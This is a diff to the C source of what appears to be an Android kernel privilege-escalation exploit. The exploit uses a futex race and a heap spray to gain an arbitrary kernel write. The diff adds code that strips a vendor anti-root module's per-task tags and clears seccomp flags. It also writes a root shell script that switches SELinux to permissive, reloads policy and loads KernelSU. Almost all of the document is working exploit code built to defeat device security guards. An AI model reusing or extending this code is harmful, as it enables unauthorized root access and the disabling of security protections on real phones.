@@ -81,6 +81,19 @@ static enum soc_family detect_soc(void) {
 
 /* Override struct field offsets (task_struct, etc.) with per-device values */
 #include "runtime_struct_offsets.h"
+/* VR.ko anti-root fallback defines */
+#ifndef VR_TAG_A_OFF
+#define VR_TAG_A_OFF           0x06
+#endif
+#ifndef VR_TAG_B_OFF
+#define VR_TAG_B_OFF           0x2c
+#endif
+#ifndef VR_SYSCALL_TP_FLAG
+#define VR_SYSCALL_TP_FLAG     0x400ULL
+#endif
+#ifndef TASK_THREAD_INFO_FLAGS_OFF
+#define TASK_THREAD_INFO_FLAGS_OFF 0x00
+#endif
 #include "offsets_json.h"
 
 static struct kernel_offsets g_external_offsets;
@@ -217,7 +230,11 @@ void *waiter_thread(void *arg __attribute__((unused))) {
   timeout.tv_sec += ROUTE_WAIT_SECONDS;
   atomic_store(&waiter_waiting, 1);
   futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
-  do_pselect_fake_lock_route();
+  if (tcp_route_selected()) {
+    do_tcp_fake_lock_route();
+  } else {
+    do_pselect_fake_lock_route();
+  }
   atomic_store(&route_done, 1);
   futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
   while (!atomic_load(&owner_chain_done)) usleep(1000);
@@ -262,7 +279,12 @@ void *consumer_thread(void *arg __attribute__((unused))) {
         atomic_fetch_add(&consumer_calls, 1);
         atomic_store(&consumer_inflight, 1);
         errno = 0;
-        long sched_ret = sched_setattr_tid(tid, PSELECT_CONSUMER_NICE);
+        /* rotate the nice every call; (calls%19)+1 is what makes
+         * sched_setattr succeed on 6.1 compact */
+        int consumer_nice = (active_offsets && active_offsets->compact_waiter)
+                                ? (calls_this_seq % 19) + 1
+                                : PSELECT_CONSUMER_NICE;
+        long sched_ret = sched_setattr_tid(tid, consumer_nice);
         if (sched_ret != 0) {
           struct timespec ft = {.tv_sec = 0, .tv_nsec = 50000000};
           long fret = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, &ft, NULL, 0);
@@ -323,10 +345,9 @@ int run_main_route_threads(void) {
 
 static int do_one_write(uintptr_t target, const char *desc, int mode, int leaf) {
   pr_info("=== %s === target=0x%016zx mode=%d leaf=%d\n", desc, target, mode, leaf);
-  /* leaf=1 uses the "write 0" payload (fake_right=0). __rb_erase_augmented()
-   * case 1 then makes __rb_change_child() write parent->rb_right (= target)
-   * with the erased node's rb_right value: fake_left is always NULL so case 1
-   * always fires, and the erased node is RED so no color fixup runs. */
+  /* Both transports write *(target) := value through the erase left-only
+   * relink: waiter words are {pc = value, right = 0, left = target} and
+   * the node is RED so no color fixup runs. leaf=1 is the value=0 payload. */
   pselect_child_node = leaf ? 0 : 1;
   set_pselect_write_mode(target, mode);
   TIMER("  heap spray start");
@@ -506,19 +527,42 @@ static void write_root_script(void) {
       "echo \"[*] ksud_file=$(ls -l \"$KSUD\" 2>/dev/null)\" >>\"$LOG\"\n"
       "echo \"[*] uname=$(uname -r)\" >>\"$LOG\"\n"
       "if [ \"$(id -u)\" -ne 0 ]; then\n"
-      "  echo '[!] temp su unavailable; aborting' | tee -a \"$LOG\"\n"
+      "  echo '[!] temp su unavailable; aborting' >>\"$LOG\"\n"
       "  exit 1\n"
       "fi\n"
       "KVER=$(uname -r | cut -d. -f1-2)\n"
       "AVER=$(uname -r | grep -o 'android[0-9]*' | head -1)\n"
       "if [ -z \"$AVER\" ] || [ -z \"$KVER\" ]; then\n"
-      "  echo '[!] cannot parse KMI from uname -r' | tee -a \"$LOG\"\n"
+      "  echo '[!] cannot parse KMI from uname -r' >>\"$LOG\"\n"
       "  exit 1\n"
       "fi\n"
       "KMI=\"${AVER}-${KVER}\"\n"
-      "if ! grep -q kernelsu /proc/modules 2>/dev/null; then\n"
+      "# step 1: restore policy (W1 already made permissive)\n"
+      "FIXUP_RC=1\n"
+      "for i in $(seq 1 10); do\n"
+      "  echo \"[*] fixup: attempt $i\" >>\"$LOG\"\n"
+      "  load_policy /sys/fs/selinux/policy >>\"$LOG\" 2>&1 &\n"
+      "  LPID=$!\n"
+      "  (sleep 8; kill -9 $LPID 2>/dev/null) &\n"
+      "  SPID=$!\n"
+      "  wait $LPID 2>/dev/null\n"
+      "  FIXUP_RC=$?\n"
+      "  kill $SPID 2>/dev/null\n"
+      "  if [ \"$FIXUP_RC\" -eq 0 ]; then\n"
+      "    break\n"
+      "  fi\n"
+      "  sleep 2\n"
+      "done\n"
+      "echo \"[*] policy fixup rc=$FIXUP_RC\" >>\"$LOG\"\n"
+      "if [ \"$FIXUP_RC\" -eq 0 ]; then\n"
+      "# load_policy ok: late-load (module init re-enforces); already-loaded restores below\n"
+      "if grep -q kernelsu /proc/modules 2>/dev/null; then\n"
+      "  KSU_ALREADY=1\n"
+      "  echo \"[*] kernelsu already loaded; skipping late-load\" >>\"$LOG\"\n"
+      "else\n"
+      "  KSU_ALREADY=0\n"
       "  if [ ! -x \"$KSUD\" ]; then\n"
-      "    echo '[!] ksud missing; cannot late-load' | tee -a \"$LOG\"\n"
+      "    echo '[!] ksud missing; cannot late-load' >>\"$LOG\"\n"
       "    exit 1\n"
       "  fi\n"
       "  echo \"[*] late-load kmi=$KMI\" >>\"$LOG\"\n"
@@ -533,29 +577,16 @@ static void write_root_script(void) {
       "  sleep 0.1\n"
       "done\n"
       "if [ \"$KSU_READY\" -ne 1 ]; then\n"
-      "  echo '[!] KernelSU module not loaded; SELinux policy/enforcing unchanged' | tee -a \"$LOG\"\n"
+      "  echo '[!] KernelSU module not loaded' >>\"$LOG\"\n"
       "  exit 1\n"
       "fi\n"
-      "echo '[+] KernelSU module loaded' | tee -a \"$LOG\"\n"
-      "echo \"[*] kernelsu.ko loaded; root pid=$$ uid=$(id -u)\" >>\"$LOG\"\n"
-      "echo 0 > /sys/fs/selinux/enforce 2>/dev/null\n"
-      "echo \"[*] setenforce 0 rc=$?\" >>\"$LOG\"\n"
-      "FIXUP_RC=1\n"
-      "for i in $(seq 1 10); do\n"
-      "  echo \"[*] fixup: attempt $i\" >>\"$LOG\"\n"
-      "  timeout 8 load_policy /sys/fs/selinux/policy >>\"$LOG\" 2>&1\n"
-      "  FIXUP_RC=$?\n"
-      "  if [ \"$FIXUP_RC\" -eq 0 ]; then\n"
-      "    break\n"
-      "  fi\n"
-      "  sleep 2\n"
-      "done\n"
-      "echo \"[*] policy fixup rc=$FIXUP_RC\" >>\"$LOG\"\n"
-      "if [ \"$FIXUP_RC\" -eq 0 ]; then\n"
-      "  echo \"[*] restoring enforcing\" >>\"$LOG\"\n"
+      "echo '[+] KernelSU module loaded' >>\"$LOG\"\n"
+      "if [ \"$KSU_ALREADY\" -eq 1 ]; then\n"
+      "  echo \"[*] kernelsu already loaded; restoring enforcing\" >>\"$LOG\"\n"
       "  echo 1 > /sys/fs/selinux/enforce 2>/dev/null\n"
+      "fi\n"
       "else\n"
-      "  echo '[!] fixup failed; SELinux left permissive' | tee -a \"$LOG\"\n"
+      "  echo '[!] fixup failed; SELinux left permissive' >>\"$LOG\"\n"
       "fi\n",
       g_home_dir);
   if (n < 0 || n >= (int)sizeof(script)) {
@@ -960,6 +991,43 @@ int run_exploit(int argc, char **argv) {
     }
 
     pr_info("child_pid=%d child_task=0x%016zx\n", child, child_task);
+    #ifdef VR_TAG_A_OFF
+  /* ------------------------------------------------------------------
+   * vivo vr.ko anti-root per-task bypass (ported from root.c)
+   * ------------------------------------------------------------------
+   * vr.ko tags every app-origin task at fork/clone time. When the task
+   * later holds euid 0, the sys_exit tracepoint probe kills it. We must
+   * strip the tag BEFORE W2 verify runs the child's getuid().
+   *
+   * This exploit primitive is 64-bit granular, so:
+   *   – task+0x00 (thread_info.flags) covers tag A at +0x06 and also
+   *     clears the VR_SYSCALL_TP_FLAG bit (0x400). This takes the task
+   *     off the sys_exit slow-path immediately.
+   *   – tag B is at +0x2c. We align down to 8 bytes (0x28) and zero the
+   *     whole word. VERIFY ON-DEVICE that zeroing bytes 0x28-0x2f is
+   *     safe on your 6.1.145 kernel; if not, comment out the tagB write.
+   * ------------------------------------------------------------------ */
+  {
+    int vr_ok = 1;
+
+    /* 1) Clear thread_info.flags word (covers tag A + tracepoint bit) */
+    vr_ok &= do_one_write(child_task + TASK_THREAD_INFO_FLAGS_OFF,
+                          "VR: flags+tagA", 1, 1);
+
+    /* 2) Clear tag B (64-bit aligned down). Belt-and-suspenders. */
+    if (vr_ok) {
+      uintptr_t tagb_align = (child_task + VR_TAG_B_OFF) & ~7ULL;
+      vr_ok &= do_one_write(tagb_align, "VR: tagB", 1, 1);
+    }
+
+    if (vr_ok) {
+      pr_success("VR.ko per-task tags cleared\n");
+    } else {
+      pr_warning("VR.ko tag clear failed; child may be killed during W2 verify\n");
+    }
+  }
+#endif
+
     pselect_child_node = 1;
 
     int got_root = retry_write_stage(
@@ -977,23 +1045,27 @@ int run_exploit(int argc, char **argv) {
      * (adb/shell skips). fork() re-arms TIF_SECCOMP while mode != 0, so mode
      * must be zeroed too; do both writes back-to-back with one probe
      * (real finit_module calls trip vendor root guards).
-     * Leaf writes land on [target] or [target+8]; a comm probe picks the side
-     * before targeting thread_info.flags (task+0) / seccomp.mode. */
+     * tcp stamps *(target) exactly, so aim straight at thread_info.flags
+     * (task+0) / seccomp.mode; only the pselect fallback needs the comm
+     * probe to tell [target] from [target+8]. */
     if (!process_has_seccomp()) {
       pr_success("no app seccomp filter (adb/shell flow); skipping W3\n");
       seccomp_ok = 1;
       break;
     }
 
+    int tcp_writes = tcp_route_selected();
     struct w3_stage_context w3_context = {
       .pipes = &pipes,
-      .leaf_to_target8 = 1,
+      .leaf_to_target8 = !tcp_writes,
     };
-    int dir_ok = retry_write_stage(
-        "W3-0: leaf dir", child_task + TASK_COMM_OFF, 1, 4, 50000,
-        verify_leaf_dir_stage, &w3_context, 1);
-    if (!dir_ok) {
-      pr_warning("W3 leaf direction probe failed; assuming [target+8]\n");
+    if (!tcp_writes) {
+      int dir_ok = retry_write_stage(
+          "W3-0: leaf dir", child_task + TASK_COMM_OFF, 1, 4, 50000,
+          verify_leaf_dir_stage, &w3_context, 1);
+      if (!dir_ok) {
+        pr_warning("W3 leaf direction probe failed; assuming [target+8]\n");
+      }
     }
 
     uintptr_t flags_target = w3_context.leaf_to_target8
@@ -1094,17 +1166,35 @@ int run_exploit(int argc, char **argv) {
     }
     if (!(ksu_log_loaded || ksu_log_failed)) usleep(500000);
   }
+  /* Module init re-enforces at the very end of kernelsu_init; wait up to
+   * 20s for it. Denied read or value 1 both mean enforcing here. */
+  int enforce_ok = 0;
+  for (int i = 0; ksu_log_loaded && !enforce_ok && i < 200; i++) {
+    int efd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
+    if (efd < 0) {
+      enforce_ok = 1;
+      break;
+    }
+    char eb[4] = {0};
+    ssize_t rn = read(efd, eb, sizeof(eb));
+    close(efd);
+    if (rn > 0 && eb[0] == '1') enforce_ok = 1;
+    if (!enforce_ok) usleep(100000);
+  }
+  if (enforce_ok)
+    pr_info("enforce=1 (enforcing)\n");
+  else if (ksu_log_loaded)
+    pr_warning("enforce=0 (still permissive)\n");
   kernelsu_ready = kernelsu_ready || ksu_log_loaded;
 
-  /* The detached root shell runs the fixup: permissive, load_policy, then
-   * enforcing. The permissive window restores network; the policy reload
-   * is what keeps it working after enforcing is restored. */
+  /* Fixup: permissive, load_policy, late-load. Module init re-enforces;
+   * policy reload keeps it working after enforcing is back. */
   if (kernelsu_ready)
-    pr_success("KernelSU ready; policy fixup result in .ghostlock_ksu.log\n");
+    pr_success("KernelSU ready\n");
   else if (ksu_log_failed)
-    pr_warning("KernelSU module load failed (see .ghostlock_ksu.log)\n");
+    pr_warning("KernelSU module load failed\n");
   else if (seccomp_ok)
-    pr_warning("temporary root ready; KernelSU module load pending (independent root shell; see .ghostlock_ksu.log)\n");
+    pr_warning("temporary root ready; KernelSU module load pending\n");
   else
     pr_warning("temporary root ready; KernelSU module not loaded (W3 seccomp clear failed)\n");
   return 0;
